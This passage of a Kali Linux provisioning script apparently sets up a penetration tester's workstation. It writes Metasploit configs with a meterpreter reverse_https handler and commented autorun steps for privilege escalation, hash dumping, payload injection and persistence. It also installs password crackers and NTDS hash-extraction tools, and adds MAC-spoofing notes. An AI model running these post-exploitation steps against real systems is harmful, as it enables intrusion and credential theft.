#  echo -ne '<proxy name="No Caching" id="3884644610" notes="" fromSubscription="false" enabled="true" mode="system" selectedTabIndex="0" lastresort="false" animatedIcons="true" includeInCycle="false" color="#990DA6" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="true" disableCache="true" clearCookiesBeforeUse="false" rejectCookies="false"><matches/><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="" port="" socksversion="5" isSocks="false" username="" password="" domain=""/></proxy>' >> "${file}"
#  echo -ne '<proxy name="Default" id="3377581719" notes="" fromSubscription="false" enabled="true" mode="direct" selectedTabIndex="0" lastresort="true" animatedIcons="false" includeInCycle="true" color="#0055E5" proxyDNS="true" noInternalIPs="false" autoconfMode="pac" clearCacheBeforeUse="false" disableCache="false" clearCookiesBeforeUse="false" rejectCookies="false"><matches><match enabled="true" name="All" pattern="*" isRegEx="false" isBlackList="false" isMultiLine="false" caseSensitive="false" fromSubscription="false"/></matches><autoconf url="" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><autoconf url="http://wpad/wpad.dat" loadNotification="true" errorNotification="true" autoReload="false" reloadFreqMins="60" disableOnBadPAC="true"/><manualconf host="" port="" socksversion="5" isSocks="false" username="" password=""/></proxy>' >> "${file}"
#  echo -e '</proxies></foxyproxy>' >> "${file}"
#fi
##--- Wipe session (due to force close)
#find /root/.mozilla/firefox/*.default*/ -maxdepth 1 -type f -name 'sessionstore.*' -delete
##--- Remove old temp files
#rm -f /tmp/iceweasel.sql



#--- Autorun Metasploit commands each startup
mkdir -p /root/.msf4/modules/
file=/root/.msf4/msf_autorunscript.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
cat <<EOF > "${file}"
#run post/windows/escalate/getsystem

#run migrate -f -k
#run migrate -n "explorer.exe" -k    # Can trigger AV alerts by touching explorer.exe...

#run post/windows/manage/smart_migrate
#run post/windows/gather/smart_hashdump

#run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 192.168.22.105 -p 443
#run persistence_JBv2 -s 10.0.144.135 -l 1 -d 1.txt
#run scraper_crowe

EOF
file=/root/.msf4/msfconsole.rc; [ -e "${file}" ] && cp -n $file{,.bkup}
#load sounds verbose=true
#load auto_add_route
#load alias
#alias dir/ls    del/rm  auto handler   https://github.com/rapid7/metasploit-framework/tree/master/plugins // https://github.com/rapid7/metasploit-framework/issues/5107
cat <<EOF > "${file}"

load auto_add_route
load alias
alias del rm
alias handler use exploit/multi/handler
load sounds
setg TimestampOutput true
setg VERBOSE true
setg ExitOnSession false
setg EnableStageEncoding true

set PAYLOAD windows/meterpreter/reverse_https

setg LHOST 0.0.0.0
setg LPORT 443

set AutoRunScript 'multi_console_command -rc "/root/.msf4/msf_autorunscript.rc"'
EOF
echo "spool /root/msf_console.`date +%m-%d-%Y_%H-%M-%S`.log" >> "${file}"






##### Install random libs
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}ssh libraries${RESET} & ${GREEN}GnuTLS${RESET} & ${GREEN}Networking Libraries${RESET} ~ compiling libraries"
#*** I know its messy...
for FILE in libssh2-1 libssh2-1-dev libgnutls-dev libdumbnet1; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
done




##### Install recordmydesktop
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}RecordMyDesktop${RESET} ~ GUI video screen capture"
apt-get -y -qq install recordmydesktop || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
#--- Installing GUI front end
apt-get -y -qq install gtk-recordmydesktop || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}


##### Configure Shutter
# shutter -f -C -e      Shutter Full Screen
# shutter -a -C -e      Shutter Active Window 


##### Install random dependencies for scripts
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}random dependencies for scripts${RESET} ~ random stuff"
#*** I know its messy...
for FILE in conntrack rwho x11-apps finger; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
done
 

##### Install python dependencies
echo -e "\n ${GREEN}[+]${RESET} Installing ${GREEN}python dependencies${RESET} ~ compiling libraries"
#*** I know its messy...
for FILE in python-libpcap python-elixir python-support python-ipy python-glade2; do
  apt-get -y -qq install "${FILE}" 2>/dev/null
done


##### Install Sublime Text
# x86
apt-get -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
if [ $proc == 32 ]; then 
  curl --progress -k -L -f "wget http://c758482.r82.cf2.rackcdn.com/sublime-text_build-3083_i386.deb" > /tmp/sublimetext.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Sublime Text" 1>&2   #***!!! hardcoded version! Need to manually check for updates
# x64
elif [ $proc == 64 ]; then
  curl --progress -k -L -f "http://c758482.r82.cf2.rackcdn.com/sublime-text_build-3083_amd64.deb" > /tmp/sublimetext.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Sublime Text" 1>&2   #***!!! hardcoded version! Need to manually check for updates
fi
dpkg -i /tmp/sublimetext.deb


##### Install Shareenum
# x86
if [ $proc == 32 ]; then 
  curl --progress -k -L -f "https://github.com/CroweCybersecurity/shareenum/releases/download/2.0/shareenum_2.0_i386.deb" > /tmp/shareenum.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Shareenum" 1>&2   #***!!! hardcoded version! Need to manually check for updates
elif [ $proc == 64 ]; then 
  curl --progress -k -L -f "https://github.com/CroweCybersecurity/shareenum/releases/download/2.0/shareenum_2.0_amd64.deb" > /tmp/shareenum.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading Shareenum" 1>&2   #***!!! hardcoded version! Need to manually check for updates
fi
dpkg -i /tmp/shareenum.deb



##### Install Github repos
chmod +x github_clone.sh
./github_clone.sh


################################ Install Work Specific Tools ################################
##### Install John the Ripper Community Enhanced Version
apt-get -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
apt-get -y -qq install libssl-dev || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
apt-get -y -qq openssl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
if [ $arm == 0 ]; then 
  curl --progress -k -L -f "http://www.openwall.com/john/j/john-1.8.0-jumbo-1.tar.gz" > /tmp/john-1.8.0-jumbo-1.tar.gz || echo -e ' '${RED}'[!]'${RESET}" Issue downloading JTR Community" 1>&2   #***!!! hardcoded version! Need to manually check for updates
  cd /tmp
  tar xzvf john-1.8.0-jumbo-1.tar.gz
  cd john-1.8.0-jumbo-1/src
  ./configure
  make clean && make -s
  make && make install
  mv /usr/sbin/john /usr/sbin/john.bak
  cd ../run
  cp john /usr/sbin/john
  
  # Optional
  #john --test
fi

##### Install Work Specific Scripts
# Github download
cd $gitdir
git clone https://jbarcia@github.com/jbarcia/Crowe-Scripts.git
ln -s /root/github/Crowe-Scripts/toolslinux /
ln -s /root/github/Crowe-Scripts/toolsv3 /
# Crowe Medusa v2.2_rc2
if [ $arm == 0 ]; then 
  cp /toolslinux/passwords/medusa/Crowe_Medusa-2.2_rc2.zip /tmp/
  cd /tmp
  unzip Crowe_Medusa-2.2_rc2.zip
  cd root/medusa-2.2_rc2/
  ./configure && make && make install
fi
# NTDS_EXTRACT
mkdir ~/NTDS_EXTRACT
cd ~/NTDS_EXTRACT
cp /toolsv3/Assessment/_Post-Exploitation/VSS/libesedb-alpha-20120102.tar.gz ~/NTDS_EXTRACT/
cp /toolsv3/Assessment/_Post-Exploitation/VSS/ntdsxtract_v1_0.zip ~/NTDS_EXTRACT/
cp /toolsv3/Assessment/_Post-Exploitation/VSS/dshashes.py ~/NTDS_EXTRACT/
tar zxvf libesedb-alpha-20120102.tar.gz
unzip ntdsxtract_v1_0.zip
cp dshashes.py NTDSXtract\ 1.0/dshashes.py
cd libesedb-20120102
chmod +x configure
./configure && make

###### Loki Setup
#apt-get -y -qq install curl || echo -e ' '${RED}'[!] Issue with apt-get'${RESET}
#if [ $arm == 0 ]; then 
#  apt-get -y remove python-libpcap
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-central_0.6.17ubuntu2_all.deb" > /tmp/python-central_0.6.17ubuntu2_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-central_0.6.17ubuntu2_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  cd /tmp
#  dpkg -i python-central_0.6.17ubuntu2_all.deb
#fi
## x86
#if [ $proc == 32 ]; then 
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libssl0.9.8_0.9.8o-7_i386.deb" > /tmp/libssl0.9.8_0.9.8o-7_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libssl0.9.8_0.9.8o-7_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dpkt_1.6+svn54-1_all.deb" > /tmp/python-dpkt_1.6+svn54-1_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dpkt_1.6+svn54-1_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dumbnet_1.12-3.1_i386.deb" > /tmp/python-dumbnet_1.12-3.1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dumbnet_1.12-3.1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/pylibpcap_0.6.2-1_i386.deb" > /tmp/pylibpcap_0.6.2-1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading pylibpcap_0.6.2-1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/loki_0.2.7-1_i386.deb" > /tmp/loki_0.2.7-1_i386.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading loki_0.2.7-1_i386.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  dpkg -i libssl0.9.8_0.9.8o-7_i386.deb python-dpkt_1.6+svn54-1_all.deb python-dumbnet_1.12-3.1_i386.deb pylibpcap_0.6.2-1_i386.deb
#  dpkg –i loki_0.2.7-1_i386.deb
## x64
#elif [ $proc == 64 ]; then
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libssl0.9.8_0.9.8o-7_amd64.deb" > /tmp/libssl0.9.8_0.9.8o-7_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libssl0.9.8_0.9.8o-7_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dpkt_1.6+svn54-1_all.deb" > /tmp/python-dpkt_1.6+svn54-1_all.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dpkt_1.6+svn54-1_all.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/python-dumbnet_1.12-3.1_amd64.deb" > /tmp/python-dumbnet_1.12-3.1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading python-dumbnet_1.12-3.1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/pylibpcap_0.6.2-1_amd64.deb" > /tmp/pylibpcap_0.6.2-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading pylibpcap_0.6.2-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libcap-dev_2.22-1.2_amd64.deb" > /tmp/libcap-dev_2.22-1.2_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libcap-dev_2.22-1.2_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/libpcap0.8-dev_1.3.0-1_amd64.deb" > /tmp/libpcap0.8-dev_1.3.0-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading libpcap0.8-dev_1.3.0-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#  curl --progress -k -L -f "https://github.com/jbarcia/kali_setup/blob/master/loki_debs/loki_0.2.7-1_amd64.deb" > /tmp/loki_0.2.7-1_amd64.deb || echo -e ' '${RED}'[!]'${RESET}" Issue downloading loki_0.2.7-1_amd64.deb" 1>&2   #***!!! hardcoded version! Need to manually check for updates
#
#  dpkg -i libssl0.9.8_0.9.8o-7_amd64.deb python-dpkt_1.6+svn54-1_all.deb python-dumbnet_1.12-3.1_amd64.deb pylibpcap_0.6.2-1_amd64.deb libcap-dev_2.22-1.2_amd64.deb libpcap0.8-dev_1.3.0-1_amd64.deb
#  dpkg -i loki_0.2.7-1_amd64.deb
#fi

##### Install 32 bit libraries for wmic.py
#if [ $proc == 64 ]; then 
#  dpkg --add-architecture i386
#  apt-get update
#  apt-get install ia32-libs
#  cp pth-wmi/kaliwmis-32 /usr/sbin/kaliwmis-32
#fi

#############################################################################################




cat <<EOF > /root/Desktop/Network.txt
macchanger -l|grep -i Cisco
macchanger -l|grep -i VMWare


DHCP
ifconfig <interface> down
macchanger --mac=XX:XX:XX:XX:XX:XX <interface>
ifconfig <interface> up
dhclient <interface>


STATIC
ifconfig <interface> down
macchanger --mac=XX:XX:XX:XX:XX:XX <interface>
ifconfig <interface> <IP_Address> netmask 255.255.255.0 broadcast <IP_Address>.255
echo "nameserver <DNS_SERVER>" >> /etc/resolv.conf
route add default gw <GATEWAY_Address>
ifconfig <interface> up

EOF




echo -e '\n'${BLUE}'[*]'${RESET}' '${BOLD}'Done!'${RESET}'\n\a'
exit 0
